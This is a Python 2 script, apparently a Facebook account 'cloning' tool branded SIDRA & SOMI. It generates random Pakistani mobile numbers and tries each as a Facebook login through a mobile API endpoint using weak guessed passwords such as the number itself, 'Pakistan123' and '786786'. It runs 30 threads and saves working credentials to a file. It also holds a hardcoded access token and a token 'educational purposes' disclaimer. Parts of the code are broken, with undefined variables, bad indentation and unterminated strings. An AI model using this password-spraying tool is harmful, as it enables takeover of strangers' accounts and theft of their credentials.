# SidraSOMI# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;92m░██████╗░█████╗░███╗░░░███╗██╗Updated ✔
\033[1;92m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;97m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;92m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;92m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝

\033[1;92m░██████╗██╗██████╗░██████╗░░█████╗░
\033[1;92m██╔════╝██║██╔══██╗██╔══██╗██╔══██╗
\033[1;97m╚█████╗░██║██║░░██║██████╔╝███████║
\033[1;97m░╚═══██╗██║██║░░██║██╔══██╗██╔══██║
\033[1;92m██████╔╝██║██████╔╝██║░░██║██║░░██║
\033[1;92m╚═════╝░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═\
       \033[1;96m  ╭━━━━━━━╮             ╭━━━━━━━╮																		
      \033[1;96m   ┃ ●  ══ ┃             ┃  ● ══ ┃ 																		
     \033[1;96m    ┃███████┃             ┃███████┃																		
    \033[1;96m     ┃███████┃             ┃███████┃																		
   \033[1;96m      ┃███████┃             ┃███████┃																		
  \033[1;96m       ┃███████┃\033[1;91m>>PakStar >>\033[1;96m┃███████┃																		
   \033[1;96m      ┃███████┃             ┃███████┃																		
    \033[1;96m     ┃███████┃             ┃███████┃																		
     \033[1;96m    ┃███████┃             ┃███████┃																		
     \033[1;96m    ┃███████┃             ┃███████┃																		
      \033[1;96m   ┃   ○   ┃             ┃    ○  ┃																		
       \033[1;96m  ╰━━━━━━━╯             ╰━━━━━━━╯

\033[1;96m---------------------SIDRA---------------------

\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mPAK STAR🎭                     \033[0;91m      ║
\033[0;91m║\033[0;91mYoutube :\033[0;92m SOMI BRAND..                    \033[0;91m     ║
\033[0;91m║ \033[0;93m  :\033[0;92m Whtsapp Num:\033[0;91m+923455453538║
\033[0;95m╰════════════════════════════════════════════╯

\033[1;96m--------------------SOMI----------------------
"""

####Logo####

logo1 = """
\033[1;92m░██████╗░█████╗░███╗░░░███╗██╗Updated ✔
\033[1;92m██╔════╝██╔══██╗████╗░████║██║
\033[1;97m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;97m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;92m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;92m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝

\033[1;92m░██████╗██╗██████╗░██████╗░░█████╗░
\033[1;92m██╔════╝██║██╔══██╗██╔══██╗██╔══██╗
\033[1;97m╚█████╗░██║██║░░██║██████╔╝███████║
\033[1;97m░╚═══██╗██║██║░░██║██╔══██╗██╔══██║
\033[1;92m██████╔╝██║██████╔╝██║░░██║██║░░██║
\033[1;92m╚═════╝░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═\

\033[1;96m------------------SiDRA----------------------

\033[1;96m══║══▒═💀═▒═💀═▒═══¤═¤═¤═════════════════════║🔥
\033[1;96m══║✯𝖈𝖗𝖊𝖆𝖙𝖔𝖗 ☪ SIDRA & SOMI ║🔥
\033[1;96m══║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ☪ S&S BRAND║🔥
\033[1;96m══║✯ℑ,𝔪 𝔫𝔬𝔱 𝔯𝔢𝔰𝔭𝔬𝔫𝔰𝔦𝔟𝔩𝔢 𝔞𝔫𝔶 𝔪𝔦𝔰𝔰 𝔲𝔰𝔢  ☪║🔥
\033[1;96m══║══▒═💀═▒═💀═▒═══¤═¤═¤═════════════════════║🔥"""


\033[1;96m-----------------SOMi------------------------
"""
logo2 = """
\033[1;92m░██████╗░█████╗░███╗░░░███╗██╗Updated ✔
\033[1;92m██╔════╝██╔══██╗████╗░████║██║
\033[1;97m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;97m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;92m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;92m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝

\033[1;92m░██████╗██╗██████╗░██████╗░░█████╗░
\033[1;92m██╔════╝██║██╔══██╗██╔══██╗██╔══██╗
\033[1;97m╚█████╗░██║██║░░██║██████╔╝███████║
\033[1;97m░╚═══██╗██║██║░░██║██╔══██╗██╔══██║
\033[1;92m██████╔╝██║██████╔╝██║░░██║██║░░██║
\033[1;92m╚═════╝░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═\

\033[1;96m---------------------SiDRA--------------------

   \033[1;96m-┈┈┈┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈         
  \033[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈        
   \033[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   
   \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈   
  \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈
  \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
  \033[1;96m ─────────────•◈•──────────  
  \033[1;92m███████▒▒Welcome To SIDRA&SOMI▒▒████████
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mSIDRA\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;94mAuthor\033[1;92m: \033[1;91mSIDRA SOMI
\033[1;94mSidra&Somi\033[1;91m: \033[1;91▒▓██████████████]99.9
\033[1;94mFacebook\033[1;93m: \033[1;91mSO MI
\033[1;94mWhatsapp\033[1;94m: \033[1;91m+923455453538
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mSOMI\033[1;95m♡╰──────────•◈•──────────╯♡"""

                                                
\033[1;96m---------------------SOMI--------------------
"""

CorrectPasscode = "sidrasomi"

loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;97mPASSWORD \x1b[1;97m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[1;92mCORRECT
                  """
            loop = 'false'
    else:
            print "\033[1;91mWRONG"
            os.system('https://www.facebook.com/profile.php?id=100041349421055')

##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;97m«-----------------\033[1;97mDisclaimer\033[1;97m---------------»"
        time.sleep(0.05)
        print "\033[1;43m       \033[1;34mThis Tool is for Educational Purpose   \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mThis presentation is for educational          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mpurposes ONLY.How you use this information    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mis your responsibility.I will not be          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mheld accountable This Tool/Channel Doesn't    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mSupport illegal activities.for any illegal    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mActivitie This Tool is for Educational Purpose\033[1;0m"
        time.sleep(0.05)
        print "\033[1;97m«-----------------\033[1;97mSiDra & SOMI\033[1;97m---------------»"
    print "\033[1;93m[1]\x1b[1;92mFast Cloning Without fb id \033[1;95m[New Update]"
    time.sleep(0.05)
    print '\x1b[1;93m[0]\033[1;95m Exit ( C u soon )'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;97mCHOOSE: \033[1;95m")
    if peak =="":
        print "\x1b[1;95mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo2
    print '\x1b[1;96m[1]  START CRACKING'
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;95mCHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "Enter any Pakistan Mobile code Number"+'\n'
        print 'Enter any code 1 to 49 All Network
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;91m-'
    xxx = str(len(id))
    jalan ('\033[1;92m Total ids number: '+xxx)
    jalan ('\033[1;92mCode you choose: '+c)
    jalan ("\033[1;92mWait A While Start Cracking...")
    jalan ("\033[1;92mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;97m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(ok✔)  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Ok✔)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="Pakistan123"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(ok✔)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="Pakistan"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(ok✔)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="786786"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(ok✔)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 10 to 20 days")
    print ''
    print """
   
 ¸,.-~·*¨.::::::::::¨*·~-.,¸ 
      ¸.· ´::::::´: . · .¨             ::` ·.¸ 
  ¸·´,;':::::::' :· .     ·   .  :      ::::::`·¸ 
 ¸·;;;;'::::::: · . :'      ·    .     .  :::::::::·¸ 
,;;;;;;:::::::.:. ·         ·     :       :::::::::::.   
;;;;;;;;::::::..· :´  .       '     ·     .:::::::::::::                                        
';;;;;;;;,:::'::·.......¸.·::·.¸.......::::::::::::::::: 
 ';;;;;;;;;;;;;;,,¸:::::::::;::::::::::::::::::::::::::' 
 ';.¸.-·~·-.,¸;;;;;;,:::´`:::::::::::¸,.-·~·-.¸.::' 
  ;;`·.¸      ¯¨*·.¸';;.'::::.¸.·*¨¯       ¸.·´:: 
   ';;:::'`·.¸●       ')`:::::(     ●   ¸.·´::: 
     `·.::::::`·--·´ :::::: `·-·´ .::::·´::: 
         `·,;;:::.  :·:´ø· ø `. ::. ' ·.:::·´ 
            `·-.:::.·: ::.:.: · : :::::.-·´ 
               ·.::.·-~ .::·´::::: 
                 )`·.:.  : . ·.::·´( 
                ,/',; '`··´  :.'\ 
   _¸.·´,;;;             .:::.`·.¸_ 
.·´   |`:¯'`: |`:¯`:    |`:¯'`: |`·.¯¯¯¯`·´¯('|`:¯`·.  |`:¯: 
    .·´ .·´|`·.`:   :    `':   :  `·.`·.`·.¯`·.·´|'`: :`·.`·.
.·´  .·´__|   `·. :      |`·. `·.  `·. )  `>|.·'  : :`·.`·.`'
:    :¯¯¯:     :  `·´¯¯`·. :  :  .·´.·´_.·´`·.': :   `·.:  : 
`·._`·..·´   ¸.·|`·.·´¯`·.·´|`·.|·´_____.·.(·'_.|   '.·'_.| 
`·.|.·´__.·´ .·´`·.|.·´`·.|·´`·.¸||______|/\||_'|/   |__|/ 
   |___'|.·´  somi sidra PakAnomiyous     -«

\033[1;96mThanks me later
\033[1;95mFb\033[1;97mSOmi
\033[1;95myoutube\033[1;97mhttps://w ww.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()

y
